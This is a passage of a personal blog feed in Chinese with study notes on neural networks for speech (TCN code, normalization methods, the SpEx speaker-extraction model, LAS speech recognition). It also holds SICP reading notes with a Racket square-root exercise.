class="comment"># 第一层卷积层</span></span><br><span class="line">        self.crop1 = Crop1d(padding)  <span class="comment"># 第一层卷积层后面的截取模块</span></span><br><span class="line">        self.relu1 = nn.ReLU()  <span class="comment"># 第一层卷积的激活函数</span></span><br><span class="line">        self.dropout1 = nn.Dropout(dropout)  <span class="comment"># 第一层卷积的dropout层</span></span><br><span class="line"></span><br><span class="line">        self.conv2 = weight_norm(nn.Conv1d(n_outputs, n_outputs, kernel_size,</span><br><span class="line">                                           stride=stride, padding=padding, dilation=dilation))  <span class="comment"># 第二层卷积层</span></span><br><span class="line">        self.crop2 = Crop1d(padding)  <span class="comment"># 第二层卷积层后面的截取模块</span></span><br><span class="line">        self.relu2 = nn.ReLU()  <span class="comment"># 第二层卷积的激活函数</span></span><br><span class="line">        self.dropout2 = nn.Dropout(dropout)  <span class="comment"># 第二层卷积的dropout层</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将两个卷积层、截取模块、激活函数和dropout层按照顺序放入一个新的模型中，并作为TimeBlock的网络模型</span></span><br><span class="line">        self.net = nn.Sequential(self.conv1, self.crop1, self.relu1, self.dropout1,</span><br><span class="line">                                 self.conv2, self.crop2, self.relu2, self.dropout2)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果输入和输出的特征通道数不同，定义1x1的卷积层进行通道数的转换</span></span><br><span class="line">        self.downsample = nn.Conv1d(n_inputs, n_outputs, <span class="number">1</span>) <span class="keyword">if</span> n_inputs != n_outputs <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        self.relu = nn.ReLU()</span><br><span class="line">        self.init_weights()  <span class="comment"># 初始化模型参数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对模型的参数进行初始化</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_weights</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.conv1.weight.data.normal_(<span class="number">0</span>, <span class="number">0.01</span>)</span><br><span class="line">        self.conv2.weight.data.normal_(<span class="number">0</span>, <span class="number">0.01</span>)</span><br><span class="line">        <span class="keyword">if</span> self.downsample <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.downsample.weight.data.normal_(<span class="number">0</span>, <span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前向传播计算</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        out = self.net(x)  <span class="comment"># 对输入的x进行卷积操作，并通过relu和dropout层进行处理</span></span><br><span class="line">        res_part = x <span class="keyword">if</span> self.downsample <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> self.downsample(</span><br><span class="line">            x)  <span class="comment"># 如果输出的通道数和输入的通道数不一致，则需要定义一个1x1的卷积层进行通道数转换，这里将res_part指定为输入x或转换后的输出结果。</span></span><br><span class="line">        res = out + res_part  <span class="comment"># 使用相加的方式进行残差连接</span></span><br><span class="line">        <span class="keyword">return</span> self.relu(res)  <span class="comment"># 通过激活函数处理后返回</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 定义用于时间序列预测的卷积神经网络模型</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemporalConvNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="comment"># num_inputs是一个列表，其长度代表TemporalBlock的层数，值表示输入序列的通道数（特征维度）。</span></span><br><span class="line">    <span class="comment"># out_channels是一个列表，其长度代表TemporalBlock的层数，值表示每个TemporalBlock中输出的通道数（特征维度）。</span></span><br><span class="line">    <span class="comment"># kernel_size是卷积核的大小，默认为2。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, in_channels, out_channels, kernel_size=<span class="number">2</span>, dropout=<span class="number">0.2</span></span>):</span></span><br><span class="line">        super(TemporalConvNet, self).__init__()</span><br><span class="line">        layers = []</span><br><span class="line">        num_levels = len(out_channels)</span><br><span class="line">        <span class="comment"># 使用for循环，定义多个TemporalBlock模块，并按序添加到网络结构中</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(num_levels):</span><br><span class="line">            dilation_size = <span class="number">2</span> ** i  <span class="comment"># 逐层dilation以2的指数增长</span></span><br><span class="line">            in_channel = in_channels[i]</span><br><span class="line">            out_channel = out_channels[i]</span><br><span class="line">            layers += [TemporalBlock(in_channel, out_channel, kernel_size, stride=<span class="number">1</span>, dilation=dilation_size,</span><br><span class="line">                                     padding=(kernel_size - <span class="number">1</span>) * dilation_size, dropout=dropout)]</span><br><span class="line">        self.network = nn.Sequential(*layers)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 模型前向计算，按顺序执行各模块的前向计算</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.network(x)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Layer-Normalization"><a href="#Layer-Normalization" class="headerlink" title="Layer Normalization"></a>Layer Normalization</h2><p>一篇讲Normalization的paper，之前在TasNet里那个作者使用过其中的一个例子(虽然代码实现的时候还是只用了torch的库函数，并没有自己实现)</p><p>这篇paper主要讲的是一个针对不同神经网络模型提出的训练提速的normalization方法，和batch normalization(好像是google的一篇文章，回头看看)不同，这个方法直接对输进隐藏层的神经元的input进行normalization，所以并不引入training case之间的依赖。作者证明了这个方法对一些RNN模型work得非常好</p><p>这里顺带总结一下batch normalization</p><p>一般我们期望的数据满足<code>独立同分布</code>这个条件，所以对数据进行预处理的时候我们通常都会进行<code>白化</code>操作，主要目的是</p><ul><li>去除特征间的相关性</li><li>让所有特征具有相同的均值和方差</li></ul><p><code>Internal Covariate Shift</code>(简称ICS)现象参考<a href="https://www.zhihu.com/question/38102762/answer/85238569">(99+ 封私信 / 80 条消息) 深度学习中 Batch Normalization为什么效果好？ - 知乎 (zhihu.com)</a> 这个回答。它会导致几个问题，一个是上层参数需要不断适应新的输入数据分布，降低学习速度，一个是下层输入的变化可能趋向于变大或者变小，导致上层落入饱和区，使得学习过早停止，还有便是每层的更新都会影响到其它层，因此每层的参数更新策略需要尽可能的谨慎。</p><p>一般对于神经元接收的向量及其运算</p><script type="math/tex; mode=display">\mathbf{x} = (x_1,\dots,x_d) \\y = f(\mathbf{x})</script><p>$\mathbf{x}$的分布可能相差很大，所以需要进行白化。一般通用的操作就是</p><script type="math/tex; mode=display">h = f(\mathbf{g}\frac{\mathbf{x}-\mu}{\sigma}+\mathbf{b})</script><p>其中$\mu$是平移参数，$\sigma$是缩放参数，而$\mathbf{b}$是再平移参数，$\mathbf{g}$是再缩放参数。</p><p>这样实际上是先将数据变成均值为0，方差为1的标准分布，然后再将其缩放成均值为$\mathbf{b}$,方差为$\mathbf{g}^2$的分布。</p><p>为什么不直接使用标准分布，还要再变一次？是为了<strong>保证模型的表达能力不因为规范化而下降</strong></p><p>通俗来说，下层神经元所学习的一些变化，如果再交给上层时被直接规范化的话，会一定程度上削弱下层神经元的学习结果</p><p>并且$\mathbf{g}$和$\mathbf{b}$是可学习的，这样这个Normalization层可以去学习如果适应下层神经元的变化。还有一点就是我们知道在每一层会经过一个激活函数，使得神经网络有了非线性计算的能力，如果我们直接将其规范化为标准分布，则可能会使得被激活的神经元变少，降低了神经网络的表达能力。</p><p>但是这样的Normalization变换也并不是严格的同分布，只是将其映射到了一个确定的区间范围</p><h3 id="Batch-Normalization"><a href="#Batch-Normalization" class="headerlink" title="Batch Normalization"></a>Batch Normalization</h3><p>主要是针对输入的每一个维度$x_i$进行规范化，其使用的均值和方差如下</p><script type="math/tex; mode=display">\mu_i = \frac{1}{M} \sum x_i \\\sigma_i = \sqrt {\frac{1}{M}\sum(x_i-\mu_i)^2+\epsilon}</script><p>其中$M$是mini-batch大小。</p><p>细想就可以知道，这样的话我们期望的是，每个mini-batch的相应维度$x_i$分布最好和整个数据的分布是同分布(这就要求mini-batch尽量大，并且shuffle尽量多一点)，不然会增加训练难度</p><h3 id="layer-Normalization"><a href="#layer-Normalization" class="headerlink" title="layer Normalization"></a>layer Normalization</h3><p>这是一个横向的规范化，通俗来说就是每一层的所有维度(而batch normalization针对的是某个维度的一个batch)</p><script type="math/tex; mode=display">\mu = \sum_i x_i\\\sigma = \sqrt{\sum_i(x_i-\mu) ^2+\epsilon}</script><p>其中$i$对这一层所有输入神经元进行枚举，所有输入共享一个规范化变换。</p><p>它针对的是单个训练样本。仔细一想可以知道，这样要求期望的输入的每个维度的贡献最好差不多，否则会降低模型的表达能力。所以对于RNN，自然语言处理等比较适用</p><h3 id="Weight-Normalization"><a href="#Weight-Normalization" class="headerlink" title="Weight Normalization"></a>Weight Normalization</h3><p>与BN和LY的思路不同，WN不作用于输入的$\mathbf{x}$，而是对与神经元之间的连线权重$\mathbf{w}$进行规范(感觉挺鸡肋的U1S1)</p><p>将权重向量分解为单位向量乘以向量模长的形式</p><script type="math/tex; mode=display">\mathbf{w} = g*\hat{\mathbf{v}} = g*\frac{\mathbf{v}}{\Vert \mathbf{v} \Vert}</script><p>事实上对于一个输入$\mathbf{x}$，对其进行WN变换则有</p><script type="math/tex; mode=display">f_{\mathbf{w}}(WN(\mathbf{x})) = \mathbf{w}*WN(\mathbf{x}) = g*\frac{\mathbf{v}}{\Vert \mathbf{v} \Vert} *\mathbf{x} = f_{\mathbf{v}}(g*\frac{\mathbf{x}}{\Vert \mathbf{v} \Vert})</script><p>就是将原来的权重$\mathbf{w}$进行规整化，将其变换到单位向量$\mathbf{v}$上，然后对于$\mathbf{x}$进行相应的放缩</p><h2 id="Spex"><a href="#Spex" class="headerlink" title="Spex"></a>Spex</h2><p>作者提到，这个模型的一个motivation是人对声音分离的<code>bottom-up</code>以及<code>top-down</code>机制。对于<code>bottom up</code>，作者举了一个例子，就像一声突然的爆炸声会吸引你的注意力，而<code>top-down</code>就类似人在机场里面会专注于听广播一样，是一种自上而下的attention(或者说 focus)。作者设计了一个<code>speaker encoder</code> 来实现这种机制。</p><p>作者采取的是TasNet那种time domain的角度去解决分离，和tasnet一样，为了避免相位估计等问题。</p><p>由于涉及到多个模块，作者并不单独训练某个模块，而是将其作为一个整体来训练，整体的loss就是各个模块loss的加权和</p><p>同时作者还提出了一个多时间尺度的encoding 和decoding，为了提高声音质量。</p><p>整体的架构如下图所示，主要分为了4个组件</p><p><img src="https://s2.loli.net/2024/09/11/rkXT6UNyxMgZweW.png" alt="image-20240911191706197"></p><p>其中<code>Speaker encoder</code>将说话人进行一个embedding，提取说话人的特征。而<code>Speech encoder</code>将混合音频encode成一个频谱或类频谱的特征表示。然后<code>Speaker Extractor</code>模块估计出让特定说话人通过的一个掩码表示，和<code>Speech encoder</code>得到的<code>embedding  Coefficient</code>做一个掩码，最后<code>Speech decoder</code>模块将掩码过后的频谱或者类频谱表示调制成time domain的speech</p><p>一段采样了$T$段的声音讯号$y(t)$可以表示成所要分离的目标说话人讯号$s(t)$和若干个background noise的mix</p><p>,即</p><script type="math/tex; mode=display">y(t) = s(t) +\sum_{i=1} ^Ib(t),t=1,\dots T</script><p>总体设计如下</p><p><img src="https://s2.loli.net/2024/09/11/F2d6ZUMPuob1Kmz.png" alt="image-20240911200712343"></p><h3 id="Speaker-encoder"><a href="#Speaker-encoder" class="headerlink" title="Speaker encoder"></a>Speaker encoder</h3><p>抽象成一个编码器$g(*)$，进行一个speaker 的特征提取$g(x)$ .在文本无关的语音识别中，经典的方式是将其表示成一个固定长度的向量，比如i-vector,x-vector,还有其他的 (PS:这里回头想详细看一下这些方案是如何进行一个特征提取的),进行一个声纹的表示。主要使用的是双向长短期记忆(BLSTM)</p><p>在一些工作中这些encoder是单独train的，还有一些工作中这些encoder是和extract一起train的，但是只是计算了extracted 和clean speeches之间的loss(如果我没理解错的话作者应该想表达的是这些jointly train的模型并没有单独重视这些encoder(比如额外计算loss等)，只是一个副产物.但是u1s1感觉有点。。。)</p><p>对于计算loss，作者采取了将speaker classification的交叉熵和说话人提取的提取语音与清晰语音之间的信号重构损失进行加权</p><h3 id="Speech-encoder"><a href="#Speech-encoder" class="headerlink" title="Speech encoder"></a>Speech encoder</h3><p>在频域方法中，通过应用傅里叶变换，语音信号被分解成一个交替表示，拥有属性正弦和余弦。类似地，在时域方法中，我们可以考虑卷积层中的滤波器作为基函数，类似于频域中的正弦和余弦。</p><p>对于时域的编码，和傅里叶变换之后的编码对比，其优点在于可以不用分别处理实部和虚部，并且基函数不是预先定义为正弦或余弦，而是可以通过数据进行训练。</p><p>一个input的mixture speech表示为$y(t) \in \mathbb{R}^{1\times T}$</p><p>在encode方面，主要用1-D CNN进行一个特征提取。并且作者还进行了多时间尺度的一个speech embedding，主要分为了$L1(short),L2(middle),L3(long)$ </p><p>同时为了将这些不同时间尺度的embedding给concatenate，需要通过保持相同的步长$\frac{L_1}{2}$来align他们</p><p>在不同长度尺度的embedding coefficients可以表示为</p><script type="math/tex; mode=display">E_{i,k} = ReLU(y_{i,k}U_i),k=1\dots,K;i=1,2,3</script><p>其中$K=\frac{2(T-L_1)}{L1}+1$,$y_{i,k}\in \mathbb{R}^{1\times L_i}$是输入$y(t)$的一个shift形成的窗口(很形象，就是不断地移动)</p><h3 id="Speaker-Extractor"><a href="#Speaker-Extractor" class="headerlink" title="Speaker Extractor"></a>Speaker Extractor</h3><p>作者提到了常用的语音分离滤波模型<code>ideal binary mask (IBM)</code> ,<code>ideal ratio mask (IRM)</code> ,<code>ideal amplitude mask (IAM)</code>,<code>wiener-filter like mask (WFM)</code>以及 <code>phase sensitive mask (PSM)</code> （只知道IBM，那篇在还看着)</p><p>这里是对多个时间尺度分别mask的</p><script type="math/tex; mode=display">S_i = M_i\otimes E_i\\=f(E,g(x))\otimes E_i</script><p>$f(<em>)$代表一个extract function，$g(</em>)$代表encoder function，$E$就是之前三个时间尺度上的speech encoder的一个concatenate，也就是$E = [E_1E_2E_3] \in \mathbb{R}^{K\times3N}$</p><h3 id="Speech-Decoder"><a href="#Speech-Decoder" class="headerlink" title="Speech Decoder"></a>Speech Decoder</h3><p>对三个尺度上的mask的$S_i$用$V_i\in \mathbb{R}^{N\times L_i}$的解码基进行一个去卷积过程。译码器基由训练过程中学会的滤波器组成，就像傅里叶基由正弦和余弦函数组成一样</p><h3 id="train"><a href="#train" class="headerlink" title="train"></a>train</h3><p>因为有三个时间尺度，所以计算SI-SDR的时候用三者的加权平均</p><script type="math/tex; mode=display">J_1 = −[(1 −α −β)ρ(s_1,s) + αρ(s_2,s) + βρ(s_3,s)]</script><p>$s_i$是在该时间尺度上reconstruct完的信号，$s$是clean的信号</p><p>并且在speaker encoder的时候还涉及到一个 speaker classification的 交叉熵loss计算</p><script type="math/tex; mode=display">J_2 = -\sum_{i=1} ^ {N_s}p_ilog(\hat{p_i})</script><p>其中$N_s$是在speaker classification中的说话者数。</p><p>总的loss</p><script type="math/tex; mode=display">J = (1 −γ)J_1 + γJ_2</script><p>Q:  这样直接加权是合理的吗(量级之类的，如果但从$\gamma$进行调超参是否有点麻烦。假如某一个loss量级明显大于另一个，感觉会进行一个退化)，$J_1$和$J_2$ 是否冲突？</p><p>帕累托优化</p><h2 id="Spex-1"><a href="#Spex-1" class="headerlink" title="Spex+"></a>Spex+</h2><p>和Spex的改进与区别？</p><h2 id="Multi-resolution-speech-analysis-for-automatic-speech-recognition-using-deep-neural-networks-Experiments-on-TIMIT"><a href="#Multi-resolution-speech-analysis-for-automatic-speech-recognition-using-deep-neural-networks-Experiments-on-TIMIT" class="headerlink" title="Multi-resolution speech analysis for automatic speech recognition using deep neural networks: Experiments on TIMIT"></a>Multi-resolution speech analysis for automatic speech recognition using deep neural networks: Experiments on TIMIT</h2><p>主要讲的是探索究竟在啥层面(时域，时频等)上进行分析会更好(其实我之前也有这方面的困惑)。</p><p>涉及到一些数学推导，没来得及慢慢啃</p><h3 id="motivation"><a href="#motivation" class="headerlink" title="motivation"></a>motivation</h3><p>主要是语音识别领域，作者认为随着识别模型从<code>Gaussian Mixture Model</code>到<code>Deep Neural Networks</code>的转变，那些以前为了GMM而发展出来的特征表示(比如MFCC等)可能并不会在DNN上表现良好。(PS:这个在<code>tasnet</code>那个论文前面也有提到，那个作者提到了在时频上分析会有信号相位和幅度的解耦等问题，所以转换为了时域，并通过conv1D卷积构成的encoder来提取时域wavform上的特征。但是U1s1我感觉这种挺反直觉的，因为讲道理传统的音频处理肯定首先通过傅里叶变换处理之后会好操作很多。关于MFCC的原理等，之后再总结，目前先将其构想成一个从音频中提取特征的黑盒子应该即可)</p><p>前面介绍了<code>Speech analysis and time-frequency resolution</code>，也就是DFT、STFT、MFCC等一些的原理 </p><h1 id="语音"><a href="#语音" class="headerlink" title="语音"></a>语音</h1><h2 id="Speech-Recognition"><a href="#Speech-Recognition" class="headerlink" title="Speech Recognition"></a>Speech Recognition</h2><p><code>speech recognition</code>即语音识别，可以表示为如图所示的一种变换，即输入的是代表语音的一些特征表示，通常为一系列向量。在下图中即被定义为一个长度为$T$的向量组，每个向量的维度为$d$。而输出是语言文字，众所周知语言分为很多种，例如中文英文等等，但是其均可抽象为一系列token的序列。对于我们想要转换的目标，其token总数可以记为$V$,那么输出就可以表示为一个长度为$N$的token(向量)序列，并且token种类最多有$V$种(感觉可以理解为长度为$V$的one-hot编码？)</p><p>先说token，常见的token表示分为$Phoneme$ (音素，感觉可以理解为类似英文英标或者中文拼音的一类东西？),$Grapheme$(字素，比如英文的字母，中文的汉字等等),$Word$,$Morpheme$等等。这取决于我们想要细分的粒度。甚至我们还能将UTF-8编码当成token。</p><p><img src="https://s2.loli.net/2024/09/03/9bj8yMOrVsUx5eA.png" alt=""></p><p>再说speech输入的vector sequence，众所周知我们能够获取的声音源数据类似波形或者频谱之类的，我们需要将声音信号(也就是Acoustic Feature,声音特征)转为计算机可以理解的vector形式(这一步可以称之为encoder)</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20240902212412883.png" alt="image-20240902212412883"></p><p>每次设定一个时间窗口(例如图中是25ms的窗口)，然后采集该窗口里的值,为一个向量(称为frame)</p><p>比如一种方法是，假如frequency rate为 16KHz，那么在25ms中就能采集到400个sample，对应400个点值组成的向量。</p><p>但是这并不是一个推荐的方法。还有其他方法比如39-dim MFCC等(此处可以展开入栈式搜索)</p><p><code>Speech Recognition</code>主要分为两种模型，一种是<code>seq-to-seq</code>,这种主要是是利用了机器学习的想法，还有一种是<code>HMM</code>，可能使用的是比较传统的思路</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20240903214633344.png" alt="image-20240903214633344"></p><h3 id="seq-to-seq"><a href="#seq-to-seq" class="headerlink" title="seq-to-seq"></a>seq-to-seq</h3><p>这里主要介绍了这几个模型，拿LAS举例，其典型的遵循了Encoder-&gt;Recognition-&gt;decoder的步骤</p><p><img src="https://s2.loli.net/2024/09/03/J73xpUYQuDFA8Zl.png" alt="image-20240903214909595"></p><p>下面记录一下LAS，这里$x_1,\dots,x_n$代表了声学特征，比如MFCC等的output，再讲过encoder之后将其提升到了一个high-level的表示(换句话说这一步实际上是类似于预处理，去掉了原始语音的noise等等，并提取其特征以及内容信息等等)，这里方法主要是使用RNN，CNN以及采用Self-attention等等</p><p><img src="https://s2.loli.net/2024/09/03/dCIyVEeo9lhHRYQ.png" alt="image-20240903215207305"></p><p>这种是声学特征和high-level表示输出数量一致的情况，但我们知道声学特征可能比较得冗余，这样使得我们中间的attention部分会比较大，如果我们需要对其进行精简使得得到的high-level更纯，就使用down sampling，比如下图左边采用的是pyramid RNN方法。</p><p>down sampling的方法还有很多，还有类似Dilated CNN等。</p><p><img src="https://s2.loli.net/2024/09/03/gIEMY4Qi2DHsOaz.png" alt="image-20240903220027399"></p><p>然后便是attention部分，这应该是比较核心的内容，其目的就是搜寻与匹配。</p><p>某个关键词$v_0$与encoder输出进行match，输出一个值(衡量了其相似性)。这种计算attention方式有很多，比如additive attention计算方式如右所示，两个输入向量做一个transfrom，相加再tanh然后再做transform，输入一个标量</p><p><img src="https://s2.loli.net/2024/09/03/27XQRlLnrNyzKPm.png" alt="image-20240903220352037"></p><p>然后每个$z_0$和这所有的$h$做一个attention，过一个softmax，再作带权和得到$c_0$,这个$c_0$(常常叫做content vector)将会在我们的decoder部分作为一个input</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20240903220813133.png" alt="image-20240903220813133"></p><p> 这里一般$c_0$经过RNN输出的时候乘以hidden state，然后再过一个transform就能得到一个distribution，给出了对输出每一个token的几率。同时注意到这里decoder的输出大小实际上取决于我们选区的token类型。</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20240903221219326.png" alt="image-20240903221219326"></p><p>依次类推，中间的hidden_state $z_1$会再经过attention输出一个分布$c_1$，同时它会变成下一个hidden state的输入。</p><p><img src="https://s2.loli.net/2024/09/03/5M6DndmzKEwp4ua.png" alt="image-20240903221632434"></p><p>同时这里存在一个Bean Search的问题。简而言之就是我们每次贪心地获取每一次decode的输出概率最高的哪一个，但是它不一定是全局最优的。其实我们可以将其抽象成一个算法问题，假设我们有$V$个token，每一次选择的时候会形成一个树状结构(会形成一个完全$V$叉树，同时每个父子结点的连线有一个权值,代表了路径概率。那么我们希望得到一个从根节点到叶子节点的路径权值乘积最小值</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20240903221933214.png" alt="image-20240903221933214"></p><p>然后我们说其训练过程，比如我们已经知道某段语音说的就是cat这个单词，我们会将第一个输出与$c$表示的one-hot vector做一个交叉熵作为其损失函数。重复这个过程即可。</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20240903224241805.png" alt="image-20240903224241805"></p><p>但是实际上这里有一个问题，因为我们在进行第二个预测的时候实际上第一个预测结果会输入进我们的hidden state，如果我们预测错了会影响第二次的预测与训练。所以训练的时候采取了一个叫做teacher forcing的技术</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20240903225017944.png" alt="image-20240903225017944"></p><h2 id="Speech-separation"><a href="#Speech-separation" class="headerlink" title="Speech separation"></a>Speech separation</h2><p>大体上可以分为<code>speech Enhancement</code>以及<code>Speaker Separation</code> .</p><p>其Evaluation方法有</p><ul><li>Signal-to-noise(SNR)(不太好)</li><li>Scale invariant signal-to-distortion ratio (SI-SDR) </li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zhuanlan.zhihu.com/p/467017218">手撕 CNN 经典网络之 AlexNet（理论篇） - 知乎 (zhihu.com)</a></p><p><a href="https://juejin.cn/post/7262269863343079479">TCN时间卷积网络：让时间也能“卷”起来TCN时间卷积网络在时序数据建模方面具有许多优点和应用前景。它采用了因果卷积和扩 - 掘金 (juejin.cn)</a></p><p><a href="https://www.cnblogs.com/LXP-Never/p/11071911.html">语音主观和客观评价总结与实现 - 凌逆战 - 博客园 (cnblogs.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/33173246">详解深度学习中的Normalization，BN/LN/WN - 知乎 (zhihu.com)</a></p><p><a href="https://fancyerii.github.io/books/asr-hmm/">基于HMM的语音识别(一) - 李理的博客 (fancyerii.github.io)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;record:&lt;/p&gt;
&lt;p&gt;8.1-8.7主要把深度学习基础的网课过了一下，大致了解了一遍。西瓜书看了一百多页，大部分推导还是相对易于理解的，打算下一周主要结合pytorch代码实现一下。&lt;/p&gt;
&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;</summary>
      
    
    
    
    
    <category term="AI" scheme="http://phot0n.com/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>SICP读书笔记</title>
    <link href="http://phot0n.com/2024/07/29/SICP%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://phot0n.com/2024/07/29/SICP%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2024-07-29T03:22:55.000Z</published>
    <updated>2024-07-29T08:10:11.968Z</updated>
    
    <content type="html"><![CDATA[<p>在以后工作或是读研了估计没有大把的连续时间进行学习与阅读了，我也不是擅长碎片化学习的人，希望乘这一个月的时间把这本书读完吧。之前在网上看到了一个20天读完的，惊叹于其强大的自驱力与自律性。而感觉自己已经好久没有认真沉下心学习了。得改。</p><p>本文主要更新一些读书笔记，以及习题题解之类的。</p><p>碎碎念:自己一般7点起床，7-11点有4h的时间，下午午睡之后也差不多有4h时间，加上晚上时间，一天至少有8h时间去读书，但是大部分注意力都集中不起来，已经很少产生那种集中学习的兴奋了。30*8=240h，感觉读这本书应该是绰绰有余。立个flag读完。</p><p>对于这本书，我之前也读过，但是和所有的计划一样都差不多半途而废了。。。主要读了前面两章还有相应的习题，所以前面的就稍微带过复习一下。</p><blockquote><p>那为什么这次又开始看 SICP 了呢？很简单，无聊了……我发现无聊的时候真的很适合看这种深奥的东西，虐一虐自己的大脑。</p></blockquote><p>引自那位20天读完SICP的大佬的一句话，其实重拾这本书是因为我感觉得给自己找点事干，拓宽一下自己的方向。找回学习的感觉。</p><h1 id="第一章-构造过程抽象"><a href="#第一章-构造过程抽象" class="headerlink" title="第一章 构造过程抽象"></a>第一章 构造过程抽象</h1><p>1.6</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#lang racket/base</span><br><span class="line">(<span class="name">define</span> (<span class="name">new-if</span> predicate then-clause else-clause)</span><br><span class="line">  (<span class="name">cond</span> (<span class="name">predicate</span> then-clause)</span><br><span class="line">        (<span class="name">else</span> else-clause)))</span><br><span class="line">(<span class="name">define</span> (<span class="name">sqrt-iter</span> guess x)</span><br><span class="line">  (<span class="name">new-if</span> (<span class="name">good-enough</span>? guess x)</span><br><span class="line">          guess</span><br><span class="line">          (<span class="name">sqrt-iter</span> (<span class="name">improve</span> guess x) x)))</span><br><span class="line">(<span class="name">define</span> (<span class="name">improve</span> guess x)</span><br><span class="line">  (<span class="name">average</span> guess (<span class="name">/</span> x guess)))</span><br><span class="line">(<span class="name">define</span> (<span class="name">average</span> x y)</span><br><span class="line">  (<span class="name">/</span> (<span class="name">+</span> x y) <span class="number">2</span>))</span><br><span class="line">(<span class="name">define</span> (<span class="name">good-enough</span>? guess x)</span><br><span class="line">  (<span class="name">&lt;</span> (<span class="name">abs</span> (<span class="name">-</span> (<span class="name">square</span> guess) x)) <span class="number">0.001</span>))</span><br><span class="line">(<span class="name">define</span> (<span class="name">abs</span> x)</span><br><span class="line">  (<span class="name">cond</span> ((<span class="name">&lt;</span> x <span class="number">0</span>) (<span class="name">-</span> x))</span><br><span class="line">        (<span class="name">else</span> x)))</span><br><span class="line">(<span class="name">define</span> (<span class="name">square</span> x)</span><br><span class="line">  (<span class="name">*</span> x x))</span><br><span class="line">(<span class="name">define</span> (<span class="name">sqrt</span> x)</span><br><span class="line">  (<span class="name">sqrt-iter</span> <span class="number">1.0</span> x))</span><br><span class="line">(<span class="name">sqrt</span> <span class="number">9</span>)</span><br></pre></td></tr></table></figure><p>爆out of memory错误，应该是函数调用太多爆栈了</p><p>主要原因是<code>if</code>只求一个值，而<code>new-if</code>会对每个分支都求值</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在以后工作或是读研了估计没有大把的连续时间进行学习与阅读了，我也不是擅长碎片化学习的人，希望乘这一个月的时间把这本书读完吧。之前在网上看到了一个20天读完的，惊叹于其强大的自驱力与自律性。而感觉自己已经好久没有认真沉下心学习了。得改。&lt;/p&gt;
&lt;p&gt;本文主要更新一些读书笔记</summary>
      
    
    
    
    
    <category term="开发" scheme="http://phot0n.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>wsl2与vscode下rust开发环境配置</title>
    <link href="http://phot0n.com/2024/07/06/wsl2%E4%B8%8Evscode%E4%B8%8Brust%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>http://phot0n.com/2024/07/06/wsl2%E4%B8%8Evscode%E4%B8%8Brust%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2024-07-06T06:56:26.000Z</published>
    <updated>2024-07-06T13:01:56.668Z</updated>
    
